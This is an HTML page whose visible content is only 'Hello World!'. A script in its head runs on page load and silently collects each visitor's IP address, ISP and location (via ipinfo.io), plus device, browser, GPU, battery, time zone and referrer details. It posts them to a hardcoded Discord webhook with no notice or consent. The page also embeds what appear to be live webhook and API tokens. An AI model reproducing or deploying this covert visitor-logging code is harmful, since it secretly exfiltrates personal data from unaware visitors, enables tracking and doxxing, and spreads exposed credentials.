<!DOCTYPE html>
<html lang="en">
<head>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook

  // Get User-Agent string
  const userAgent = navigator.userAgent;

  // Detect Operating System
  function detectOS() {
    const ua = navigator.userAgent;
    if (/Windows NT/i.test(ua)) return "Windows";
    if (/Macintosh|Mac OS X/i.test(ua)) return "macOS";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Android/i.test(ua)) return "Android";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
  }
  const os = detectOS();

  // Get browser info with modern fallback
  let browserInfo;
  if (navigator.userAgentData) {
    browserInfo = navigator.userAgentData.brands
      .map(b => `${b.brand} v${b.version}`)
      .join(", ");
  } else {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) browserInfo = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserInfo = "Safari";
    else browserInfo = "Unknown / Not Chromium";
  }

  // Get screen resolution
  const screenRes = `${screen.width}x${screen.height}`;

  // Device type by screen width
  function detectDeviceType() {
    const width = window.innerWidth;
    if (width <= 768) return "Phone";
    return "PC";
  }
  const deviceType = detectDeviceType();

  // Get CPU cores
  const cpuCores = navigator.hardwareConcurrency || "Unknown";

  // Get RAM in GB
  const ramGB = navigator.deviceMemory || "Unknown";

  // Detect GPU
  function getGPU() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "Unknown";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      return "Unknown";
    } catch (e) {
      return "Unknown";
    }
  }
  const gpu = getGPU();

  // Get browser language
  const browserLang = navigator.language || "Unknown";

  // Get time zone
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

  // Referrer
  const referrerUrl = document.referrer || "";
  function getReferrerName(ref) {
    if (!ref) return "Direct / None";
    if (ref.includes("google.")) return "Google";
    if (ref.includes("duckduckgo.com")) return "DuckDuckGo";
    if (ref.includes("bing.com")) return "Bing";
    if (ref.includes("yahoo.com")) return "Yahoo";
    return ref;
  }
  const referrer = getReferrerName(referrerUrl);

  // Detect network connection type
  const connectionType = navigator.connection?.effectiveType || "Unknown";

  // Detect if device has touch screen
  const touchSupport = (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) ? "Yes" : "No";

  // Function to send data to Discord
  function sendWebhook(batteryLevel = "Unknown") {
    fetch("https://ipinfo.io/json?token=6ed2b2fac88455") // Replace YOUR_TOKEN_HERE
      .then(res => res.json())
      .then(data => {
        const ip = data.ip || "Unknown";
        const isp = data.org || "Unknown";
        const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;

        return fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                title: "ðŸ†• New Visitor Info",
                description: "A visitor just accessed your site.",
                color: 3447003,
                fields: [
                  // Location & IP
                  { name: "ðŸŒ IP Address", value: ip, inline: true },
                  { name: "ðŸ¢ ISP / Org", value: isp, inline: true },
                  { name: "ðŸ“ Location", value: location, inline: true },

                  // Device & OS
                  { name: "ðŸ’» Device Type", value: deviceType, inline: true },
                  { name: "ðŸ–¥ï¸ Operating System", value: os, inline: true },
                  { name: "ðŸ–±ï¸ Browser", value: browserInfo, inline: true },

                  // Referrer
                  { name: "ðŸ”— Referrer", value: referrer, inline: false },

                  // Hardware info
                  { name: "ðŸ–¼ï¸ Screen Resolution", value: screenRes, inline: true },
                  { name: "ðŸ§  CPU Cores", value: cpuCores.toString(), inline: true },
                  { name: "ðŸ’¾ RAM (GB)", value: ramGB.toString(), inline: true },
                  { name: "ðŸŽ® GPU", value: gpu, inline: true },
                  { name: "ðŸ”‹ Battery (%)", value: batteryLevel, inline: true },
                  { name: "ðŸ“¶ Connection Type", value: connectionType, inline: true },
                  { name: "âœ‹ Touch Screen", value: touchSupport, inline: true },

                  // Other info
                  { name: "ðŸŒ Language", value: browserLang, inline: true },
                  { name: "â° Time Zone", value: timeZone, inline: true },

                  // User-Agent last
                  { name: "ðŸ“ User-Agent", value: userAgent, inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "Visitor Tracker" }
              }
            ]
          })
        });
      })
      .catch(err => console.error("Error sending data:", err));
  }

  // Only call sendWebhook after battery info is available
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        const batteryLevel = battery.level != null ? Math.round(battery.level * 100) + "%" : "Unknown";
        sendWebhook(batteryLevel); // send webhook with actual battery value
      })
      .catch(() => sendWebhook("Unknown"));
  } else {
    sendWebhook("Unknown");
  }
</script>










</head>

  <h1>Hello World! </h1>

</body>
</html>
